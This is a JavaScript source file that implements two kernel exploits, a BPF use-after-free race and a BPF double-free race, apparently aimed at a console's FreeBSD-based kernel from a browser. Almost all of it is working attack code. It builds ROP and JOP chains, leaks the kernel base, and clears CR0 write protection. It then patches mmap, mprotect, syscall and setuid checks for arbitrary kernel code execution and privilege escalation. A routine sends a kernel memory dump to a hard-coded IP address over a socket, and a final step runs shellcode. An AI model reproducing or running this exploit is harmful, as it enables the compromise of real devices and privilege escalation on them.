function kernExploit_bpf_race_old() {
	try {
		alert("Starting BPF UAF kexploit OLD")
		
		window.nogc = [];
		var scratchbuf = new Uint8Array(0x1000);
		var scratch = p.read8(p.leakval(scratchbuf).add32(window.leakval_slide));

		var fd = p.syscall(5, p.stringify('/dev/bpf0'), 2).low; // sys_open
                if (fd == (-1 >>> 0)) {
                     throw new Error('Failed to open first /dev/bpf0 device!');
                 }
                
		var bpfinsn = new Uint32Array(0x400);
		var bpfinsnp = p.read8(p.leakval(bpfinsn).add32(window.leakval_slide));
		bpfinsnp.nogc = bpfinsn;
		bpfinsn[0] = p.read4(p.stringify("eth0"));
		bpfinsn[1] = 0;
		p.syscall(54, fd, 0x8020426C, bpfinsnp); // 8020426C = BIOCSETIF - bind eth0
		if (p.syscall(4, fd, scratch, 40).low == (-1 >>> 0)) {
			bpfinsn[0] = p.read4(p.stringify("wlan"));
			bpfinsn[1] = 0x30;
			p.syscall(54, fd, 0x8020426C, bpfinsnp); // 8020426C = BIOCSETIF - bind wlan0
			if (p.syscall(4, fd, scratch, 40).low == (-1 >>> 0)){
				throw new Error('Failed to open first /dev/bpf0 device!');
                        }
		}

		
		// BPF helpers
		
		var push_bpf = function(bpfbuf, cmd, k) {
			var i = bpfbuf.i;
			if (!i)
				i = 0;
			bpfbuf[i*2] = cmd;
			bpfbuf[i*2+1] = k;
			bpfbuf.i = i+1;
		}

		
		var bpf_write8imm = function(bpf, offset, imm) {
			if (!(imm instanceof int64))
				imm = new int64(imm, 0);
			push_bpf(bpf, 0, imm.low); // BPF_LD|BPF_IMM
			push_bpf(bpf, 2, offset); // BPF_ST
			push_bpf(bpf, 0, imm.hi); // BPF_LD|BPF_IMM
			push_bpf(bpf, 2, offset+1); // BPF_ST -> RDI: pop rsp
		}
		
		var bpf_copy8 = function(bpf, offset_to, offset_from) {
			push_bpf(bpf, 0x60, offset_from); // BPF_LD|BPF_MEM offset_from
			push_bpf(bpf, 2, offset_to); // BPF_ST offset_to
			push_bpf(bpf, 0x60, offset_from+1); // BPF_LD|BPF_MEM offset_from+1
			push_bpf(bpf, 2, offset_to+1); // BPF_ST offset_to+1
		}
		var bpf_add4 = function(bpf, offset, val) {
			push_bpf(bpf, 0x60, offset); // BPF_LD offset
			push_bpf(bpf, 4, val); // BPF_ALU|BPF_ADD|BPF_K val
			push_bpf(bpf, 2, offset); // BPF_ST offset
		}
		
		// Setup valid program
		var bpf_valid_u32 = new Uint32Array(0x4000);		
		for (var i = 0 ; i < 0x4000;) {
			bpf_valid_u32[i++] = 6; // BPF_RET
			bpf_valid_u32[i++] = 0; // 0
		}
		
		// Setup invalid program
		var bpf_invalid_u32 = new Uint32Array(0x4000);
		for (var i = 0 ; i < 0x4000;) {
			bpf_invalid_u32[i++] = 4; // BPF_ALU|BPF_ADD|BPF_K (used as a NOP)
			bpf_invalid_u32[i++] = 0; // 0
		}
		push_bpf(bpf_invalid_u32, 5, 2); // BPF_JMP 2
		push_bpf(bpf_invalid_u32, 0x12, 0); // invalid BPF opcode
		bpf_invalid_u32.i = 16;
		
		// kROP helpers
		
		var krop_off = 0x1E;
		var reset_krop = function() {
			krop_off = 0x1E;
			bpf_invalid_u32.i = 16;
		}
		var push_krop = function(value) {
			bpf_write8imm(bpf_invalid_u32, krop_off, value);
			krop_off += 2;
		}
		var push_krop_fromoff = function(value) {
			bpf_copy8(bpf_invalid_u32, krop_off, value);
			krop_off += 2;
		}
		var finalize_krop = function(retv) {
			if (!retv)
				retv = 5;
			push_bpf(bpf_invalid_u32, 6, retv); // BPF_RET retv
		}
		
		/*
		 fake stack frame
		 */
		reset_krop();
		push_krop(window.gadgets["pop rdi"]);
		push_krop(0); // 8
		push_krop(window.gadgets["pop rdi"]); // 0x10
		push_krop(0); // 0x18
		push_krop(window.gadgets["pop rdi"]); // 0x20
		push_krop(0); // 0x28
		push_krop(window.gadgets["pop rax"]); // 0x30
		push_krop(0); // 0x38
		push_krop(window.gadgets["ret"]); // 0x40
		push_krop(window.gadgets["leave_1"]); // 0x48
		//push_krop(window.gadgets["ep"]); // 0x48
		finalize_krop();

		var bpf_valid = p.read8(p.leakval(bpf_valid_u32).add32(window.leakval_slide));
		var bpf_invalid = p.read8(p.leakval(bpf_invalid_u32).add32(window.leakval_slide));

		var bpf_valid_prog = bpfinsnp.add32(0x40);
		var bpf_invalid_prog = bpfinsnp.add32(0x80);
		
		p.write8(bpf_valid_prog, 64);
		p.write8(bpf_invalid_prog, 64);
		p.write8(bpf_valid_prog.add32(8), bpf_valid);
		p.write8(bpf_invalid_prog.add32(8), bpf_invalid);
		
		p.syscall(4, fd, scratch, 40);
		p.syscall(54, fd, 0x8010427B, bpf_valid_prog); // 0x8010427B = BIOCSETWF
		p.syscall(54, fd, 0x8010427B, bpf_invalid_prog); // 0x8010427B = BIOCSETWF
		p.syscall(4, fd, scratch, 40);

		// ioctl() with valid BPF program -> will trigger reallocation of BFP code alloc
		window.spawnthread(function(thread2){
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // what
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_valid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr*8), window.syscalls[54]); // restore ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});
		
		// ioctl() with invalid BPF program -> this will be executed when triggering bug
		window.spawnthread(function(thread2){
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // what
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_invalid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr*8), window.syscalls[54]); // restore ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});

		bpfinsn[0] = 0;

		var kern_write8 = function(addr, val) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop(val); // 0x18
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall(4, fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		
		var kern_read8 = function(addr) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["mov rax, [rdi]"]); // 0x10
			push_krop(window.gadgets["pop rdi"]); // 0x18
			push_krop(bpfinsnp); // 0x20
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x28
			
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall(4, fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read8(bpfinsnp);
		};
		
		var readable_kern_read8 = function(addr) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["mov rax, [rdi]"]); // 0x10
			push_krop(window.gadgets["pop rdi"]); // 0x18
			push_krop(bpfinsnp); // 0x20
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x28
			
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall(4, fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.readable_read8(bpfinsnp);
		}
		
		var kern_memcpy = function(dst, src, size) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(dst); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop(src); // 0x18
			push_krop(window.gadgets["pop rdx"]); // 0x20
			push_krop(size); // 0x28
			push_krop(window.gadgets["memcpy"]); // 0x30
			
			push_krop(window.gadgets["ret"]); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall(4, fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};


		var kdump = function(address, size) {
			var s = p.socket();
			alert("After pressing OK, please launch socket listen.");
			p.connectSocket(s, "192.168.123.103", 9023);
			alert("Starting kernel dumping to socket. Accept to continue.");
			var kernelBuf = p.malloc(size);
			kern_memcpy(kernelBuf, address, size);
			p.writeSocket(s, kernelBuf, size);
			p.closeSocket(s);
			alert("Kernel has theoritically been dumped on your target IP.");
		};

		var kern_leak_rip = function() {
			reset_krop();
			bpf_copy8(bpf_invalid_u32, 0, 0x1E);
			push_krop(window.gadgets["pop rdi"]);
			push_krop(bpfinsnp); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop_fromoff(0); // 0x18
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			//push_krop(window.gadgets["infloop"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall(4, fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read8(bpfinsnp);
		}
		
		//alert("mm");
		//aert(kern_leak_rip());
		var kernelBase = kern_leak_rip().sub32(window.kernel_offsets["bpf_slide"]);
		//var kernelBase = new int64(0x82200000, -1);
		//if (readable_kern_read8(kernelBase) != "7f454c4602010109")
		//	alert("Not found kernel base! 0x" + kernelBase)
		//else
		//	alert("kbase found 0x" + kernelBase)
		
		//if (getKernelBaseOnly)
		//	return kernelBase;


		alert("kbase found 0x" + kernelBase)
		
		var kern_get_cr0 = function() {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"]));
			push_krop(window.gadgets["ret"]); // 8
			push_krop(window.gadgets["pop rdi"]); // 0x10
			push_krop(bpfinsnp); // 0x16
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall(4, fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read4(bpfinsnp);
		};

		var kern_set_cr0_write = function(cr0, addr, val) {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["mov cr0, rax"])); // 0x18
			push_krop(window.gadgets["pop rdi"]); // 0x20
			push_krop(addr); // 0x28
			push_krop(window.gadgets["pop rsi"]); // 0x30
			push_krop(val); // 0x38
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"])); // 0x18
			
			push_krop(window.gadgets["pop rax"]); // 0x40
			push_krop(0); // 0x10
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop(cr0);
			while (1) {
				var rv = p.syscall(4, fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		/*
		var kern_jump_cr0 = function(addr, cr0, rdi, rsi) {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["mov cr0, rax"])); // 0x18
			push_krop(window.gadgets["pop rdi"]); // 0x20
			push_krop(rdi); // 0x28
			push_krop(window.gadgets["pop rsi"]); // 0x30
			push_krop(rsi); // 0x38
			push_krop(addr); // 0x20
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"])); // 0x18
			
			push_krop(window.gadgets["pop rax"]); // 0x40
			push_krop(0); // 0x10
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop(cr0);
			while (1) {
				var rv = p.syscall(4, fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		*/
		
		alert("Applying kernel patches");
		
		var cr0 = kern_get_cr0();
		cr0 &= ((~(1 << 16)) >>> 0);
		
		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			kern_set_cr0_write(cr0, kernelBase.add32(dest_offset), patch_data_qword);
		}
		

		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			kern_set_cr0_write(cr0, kernelBase.add32(dest_offset), kernelBase.add32(src_offset));
		}
// Patch mprotect: Allow RWX (read-write-execute) mapping
kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));

// Patch sys_mmap: Allow RWX (read-write-execute) mapping
kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));

// Patch syscall: syscall instruction allowed anywhere
kpatch(window.kernel_offsets["amd64_syscall_patch1_offset"], new int64(window.kernel_patches["amd64_syscall_patch1_1"], window.kernel_patches["amd64_syscall_patch1_2"]));
kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(window.kernel_patches["amd64_syscall_patch2_1"], window.kernel_patches["amd64_syscall_patch2_2"]));

// Patch sys_dynlib_dlsym: Allow from anywhere
//kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
//kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch2_1"], window.kernel_patches["sys_dynlib_dlsym_patch2_2"]));

// Add custom sys_exec() call to execute arbitrary code as kernel
kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));

// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));

                alert("returning kbase")
                
                //kdump(kernelBase, 0x69B8000);
		return kernelBase;
	} catch(ex) {
		fail(ex);
		return false;
	}
	
	// failed (should never go here)
	return false;
}

function kernelExploit_bpf_double_free() {

  try {
    var fd = p.syscall(5, p.stringify('/dev/bpf0'), 2).low; // sys_open
    if (fd == (-1 >>> 0)) {
      throw new Error('Failed to open first /dev/bpf0 device!');
    }
    var fd1 = p.syscall(5, p.stringify('/dev/bpf0'), 2).low; // sys_open
    if (fd1 < 0) {
      throw new Error('Failed to open second /dev/bpf0 device!');
    }

    var bpf_valid = p.malloc32(0x4000);
    var bpf_spray = p.malloc32(0x4000);
    var bpf_valid_u32 = bpf_valid.backing;

    var bpf_valid_prog = p.malloc(0x40);
    p.write8(bpf_valid_prog, 0x800 / 8);
    p.write8(bpf_valid_prog.add32(8), bpf_valid);

    var bpf_spray_prog = p.malloc(0x40);
    p.write8(bpf_spray_prog, 0x800 / 8);
    p.write8(bpf_spray_prog.add32(8), bpf_spray);

    for (var i = 0; i < 0x400;) {
      bpf_valid_u32[i++] = 6;
      bpf_valid_u32[i++] = 0;
    }

    if (p.syscall(54, fd, 0x8010427B, bpf_valid_prog).low != 0) { // sys_ioctl
      throw new Error('Failed to open bpf device!');
    }

// Spawn thread
		var spawnthread = function (name, chain) {
			var contextp = p.malloc32(0x2000);
			var contextz = contextp.backing;
			contextz[0] = 1337;
			var thread2 = new rop();
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			chain(thread2);
			p.write8(contextp, window.gadgets["ret"]);
			p.write8(contextp.add32(0x10), thread2.stackBase);
			p.syscall(324, 1);
			var retv = function () { p.fcall(window.gadgets["createThread"], window.gadgets["longjmp"], contextp, p.stringify(name)); }
			window.nogc.push(contextp);
			window.nogc.push(thread2);
			return retv;
		}
		
		var interrupt, loop;
		var sock = p.syscall(97, 2, 2);
		
		// Racing thread
		var start1 = spawnthread("GottaGoFast", function (thread2) {
			interrupt = thread2.stackBase;
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			
			thread2.push(window.gadgets["pop rdi"]);
			thread2.push(fd);
			thread2.push(window.gadgets["pop rsi"]);
			thread2.push(0x8010427B);
			thread2.push(window.gadgets["pop rdx"]);
			thread2.push(bpf_valid_prog);
			thread2.push(window.gadgets["pop rsp"]);
			thread2.push(thread2.stackBase.add32(0x800));
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
			
			thread2.push(window.gadgets["pop rdi"]);
			var wherep = thread2.pushSymbolic();
			thread2.push(window.gadgets["pop rsi"]);
			var whatp = thread2.pushSymbolic();
			thread2.push(window.gadgets["mov [rdi], rsi"]);
			
			thread2.push(window.gadgets["pop rsp"]);
			
			loop = thread2.stackBase.add32(thread2.count * 8);
			thread2.push(0x41414141);
			
			thread2.finalizeSymbolic(wherep, loop);
			thread2.finalizeSymbolic(whatp, loop.sub32(8));
		});

    var krop = new rop();
    var kscratch = p.malloc32(0x1000);
    var ctxp = p.malloc32(0x1000);
    var ctxp1 = p.malloc32(0x1000);
    var ctxp2 = p.malloc32(0x1000);

    var kpatch = function (dest_offset, patch_data_qword) {
      krop.push(gadgets['pop rax']);
      krop.push(dest_offset);
      krop.push(gadgets['pop rdi']);
      krop.push(kscratch);
      krop.push(gadgets['add rax, [rdi]']);
      krop.push(gadgets['mov rdx, rax']);
      krop.push(gadgets['pop rax']);
      krop.push(patch_data_qword);
      krop.push(gadgets['mov [rdx], rax']);
    };

    var kpatch2 = function (dest_offset, src_offset) {
      krop.push(gadgets['pop rax']);
      krop.push(kscratch);
      krop.push(gadgets['mov rax, [rax]']);
      krop.push(gadgets['pop rcx']);
      krop.push(dest_offset);
      krop.push(gadgets['add rax, rcx']);
      krop.push(gadgets['mov rdx, rax']);
      krop.push(gadgets['pop rax']);
      krop.push(kscratch);
      krop.push(gadgets['mov rax, [rax]']);
      krop.push(gadgets['pop rcx']);
      krop.push(src_offset);
      krop.push(gadgets['add rax, rcx']);
      krop.push(gadgets['mov [rdx], rax']);
    };

    var stackshift_from_retaddr = 0;

    p.write8(bpf_spray.add32(0x10), ctxp);
    p.write8(ctxp.add32(0x50), 0);
    p.write8(ctxp.add32(0x68), ctxp1);

    p.write8(ctxp1.add32(0x10), gadgets['jop1']);
    stackshift_from_retaddr += 0x8 + gadget_shifts['stackshift_jop1'];

    p.write8(ctxp.add32(0x00), ctxp2);
    p.write8(ctxp.add32(0x10), ctxp2.add32(0x08));

    p.write8(ctxp2.add32(gadget_shifts['jump_shift_jop1']), gadgets['jop2']);

    var iterbase = ctxp2;

    for (var i = 0; i < 0xF; i++) {
      p.write8(iterbase, gadgets['jop1']);
      stackshift_from_retaddr += 0x8 + gadget_shifts['stackshift_jop1'];

      p.write8(iterbase.add32(gadget_shifts['jump_shift_jop1'] + 0x20), gadgets['jop2']);

      p.write8(iterbase.add32(0x08), iterbase.add32(0x20));
      p.write8(iterbase.add32(0x18), iterbase.add32(0x28));
      iterbase = iterbase.add32(0x20);
    }

    var raxbase = iterbase;
    var rdibase = iterbase.add32(0x08);
    var memcpy = p.read8(get_jmptgt(gadgets['memcpy']));

    p.write8(raxbase, gadgets['jop3']);
    stackshift_from_retaddr += 0x8;

    p.write8(rdibase.add32(0x70), gadgets['jop4']);
    if (fwFromUA >= 4.50) {
      stackshift_from_retaddr += 0x8;
    }

    p.write8(rdibase.add32(0x18), rdibase);
    p.write8(rdibase.add32(0x08), krop.stackBase);
    p.write8(raxbase.add32(0x30), gadgets['jop_mov rbp, rsp']);

    p.write8(rdibase, raxbase);
    p.write8(raxbase.add32(gadget_shifts['jump_shift_jop5']), gadgets['jop6']);
    stackshift_from_retaddr += gadget_shifts['stackshift_jop6'];

    var topofchain = stackshift_from_retaddr;
    p.write8(raxbase.add32(gadget_shifts['jump_shift_jop6']), memcpy.add32(0xC2 - 0x90));
    p.write8(rdibase.add32(0xB0), topofchain);

    for (var i = 0; i < 0x1000 / 8; i++) {
      p.write8(krop.stackBase.add32(i * 8), gadgets['ret']);
    }

    krop.count = 0x10;

    p.write8(kscratch.add32(gadget_shifts['jump_shift_jop5']), gadgets['pop rdi']);
    p.write8(kscratch.add32(gadget_shifts['jump_shift_jop6']), gadgets['pop rax']);
    p.write8(kscratch.add32(0x18), kscratch);

    krop.push(gadgets['pop rdi']);
    krop.push(kscratch.add32(0x18));
    krop.push(gadgets['jop_mov rbp, rsp']);

    var rboff = topofchain - krop.count * 8;

    krop.push(gadgets['jop6']);
    rboff += gadget_shifts['stackshift_jop6'];

    krop.push(gadgets['pop rax']);
    krop.push(rboff);
    krop.push(gadgets['add rdi, rax; mov rax, rdi']);

    krop.push(gadgets['mov rax, [rdi]']);
    krop.push(gadgets['pop rcx']);
    krop.push(kernel_offsets['kqueue_close_slide']);
    krop.push(gadgets['sub rax, rcx']);
    krop.push(gadgets['mov rdx, rax']);
    krop.push(gadgets['pop rsi']);
    krop.push(kscratch);
    krop.push(gadgets['mov [rsi], rdx']);

    krop.push(gadgets['pop rax']);
    krop.push(gadgets['add rsp, 0x28']);
    krop.push(gadgets['mov [rdi], rax']);

    if (kernel_dump) {
      krop.push(gadgets['pop rdx']);
      krop.push(kernel_dump_size);

      krop.push(gadgets['pop rax']);
      krop.push(kscratch);
      krop.push(gadgets['mov rax, [rax]']);
      krop.push(gadgets['pop rdi']);
      krop.push(0);
      krop.push(gadgets['add rdi, rax; mov rax, rdi']);
      krop.push(gadgets['pop rcx']);
      krop.push(gadgets['ret']);
      krop.push(gadgets['mov rsi, rax; jmp rcx']);

      var kernelBuf = p.malloc(kernel_dump_size);
      krop.push(gadgets['pop rdi']);
      krop.push(kernelBuf);

      krop.push(memcpy);
    }
else if (0){
      // Disable kernel write protection
      krop.push(gadgets['pop rax']);
      krop.push(kscratch);
      krop.push(gadgets['mov rax, [rax]']);
      krop.push(gadgets['pop rcx']);
      krop.push(kernel_offsets['mov cr0, rax']);
      krop.push(gadgets['add rax, rcx']);
      krop.push(gadgets['mov rdx, rax']);
      krop.push(gadgets['pop rax']);
      krop.push(0x80040033);
      krop.push(gadgets['jmp rdx']);

      // Add custom sys_exec() call to execute arbitrary code as kernel
      kpatch(kernel_offsets['syscall_11_patch1_offset'], 2);
      kpatch2(kernel_offsets['syscall_11_patch2_offset'], kernel_offsets['jmp [rsi]']);
      kpatch(kernel_offsets['syscall_11_patch3_offset'], new int64(0, 1));

      // Patch sys_mmap: Allow RWX (read-write-execute) mapping
      kpatch(kernel_offsets['sys_mmap_patch_offset'], new int64(kernel_patches['sys_mmap_patch_1'], kernel_patches['sys_mmap_patch_2']));

      // Patch sys_mprotect: Allow RWX (read-write-execute) mapping
      kpatch(kernel_offsets['vm_map_protect_patch_offset'], new int64(kernel_patches['vm_map_protect_patch_1'], kernel_patches['vm_map_protect_patch_2']));

      // Patch syscall: syscall instruction allowed anywhere
      kpatch(kernel_offsets['amd64_syscall_patch1_offset'], new int64(kernel_patches['amd64_syscall_patch1_1'], kernel_patches['amd64_syscall_patch1_2']));
      kpatch(kernel_offsets['amd64_syscall_patch2_offset'], new int64(kernel_patches['amd64_syscall_patch2_1'], kernel_patches['amd64_syscall_patch2_2']));
    kpatch(kernel_offsets['amd64_syscall_patch3_offset'], 0xEB);


      // Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
      kpatch(kernel_offsets['sys_setuid_patch_offset'], new int64(kernel_patches['sys_setuid_patch_1'], kernel_patches['sys_setuid_patch_2']));

      // Enable kernel write protection
      krop.push(gadgets['pop rax']);
      krop.push(kscratch);
      krop.push(gadgets['mov rax, [rax]']);
      krop.push(gadgets['pop rcx']);
      krop.push(kernel_offsets['cpu_setregs']);
      krop.push(gadgets['add rax, rcx']);
      krop.push(gadgets['jmp rax']);
    }
    krop.push(gadgets['ret2userland']);
    krop.push(kscratch.add32(0x1000));

    // Clean memory post exploit
    var shellbuf = p.malloc32(0x1000);
    for (var i = 0; i < cleanup_shcode.length; i++) {
      shellbuf.backing[i] = cleanup_shcode[i];
    }


    var race = new rop();
    var kq = p.malloc32(0x10);
    var kev = p.malloc32(0x100);
    kev.backing[0] = p.syscall(97, 2, 2); // sys_socket
    kev.backing[2] = 0x1FFFF;
    kev.backing[3] = 1;
    kev.backing[4] = 5; 
    start1();
    var it = 0;

    while (1) {
      race.count = 0;

      race.push(syscalls[362]);
      race.push(gadgets['pop rdi']);
      race.push(kq);
      race.push(gadgets['mov [rdi], rax']);

      race.push(gadgets['ret']);
      race.push(gadgets['ret']);
      race.push(gadgets['ret']);
      race.push(gadgets['ret']);
      race.push_write8(loop, interrupt);
      race.push(gadgets['pop rdi']);
      race.push(fd);
      race.push(gadgets['pop rsi']);
      race.push(0x8010427B);
      race.push(gadgets['pop rdx']);
      race.push(bpf_valid_prog);
      race.push(syscalls[54]);

      race.push(gadgets['pop rdi']);
      race.push(kq.sub32(0x48));
      race.push(gadgets['mov rdi, [rdi+0x48]']);
      race.push(gadgets['pop rsi']);
      race.push(kev);
      race.push(gadgets['pop rdx']);
      race.push(1);
      race.push(gadgets['pop rcx']);
      race.push(0);
      race.push(gadgets['pop r8']);
      race.push(0);
      race.push(syscalls[363]);

      race.push(gadgets['pop rdi']);
      race.push(fd1);
      race.push(gadgets['pop rsi']);
      race.push(0x8010427B);
      race.push(gadgets['pop rdx']);
      race.push(bpf_spray_prog);
      race.push(syscalls[54]);

      race.push(gadgets['pop rdi']);
      race.push(kq.sub32(0x48));
      race.push(gadgets['mov rdi, [rdi+0x48]']);
      race.push(syscalls[6]);
      
      if(it == 0)
         alert("GottaGoFast")

      race.run();
      it++;

      if (kscratch.backing[0] != 0) {
        alert("kscratch.backing[0] != 0")

        if (kernel_dump) {
          alert('Starting kernel dumping to ' + dump_ip + ':' + dump_port + '. Accept to continue');
          var s = p.socket();
          p.connectSocket(s, dump_ip, dump_port);
          p.writeSocket(s, kernelBuf, kernel_dump_size);
          p.closeSocket(s);
          alert('Kernel has, theoretically, been dumped on your target');
        }

        alert("shell")
      
        p.syscall(74, shellbuf, 0x4000, 7); // sys_mprotect
        p.fcall(shellbuf);

        // Refresh to a clean page
        location.reload();

	alert("returning true")
        return true;
      }
    }
  } catch (e) {
    throw new Error(e.message);
  }

  return false;
}
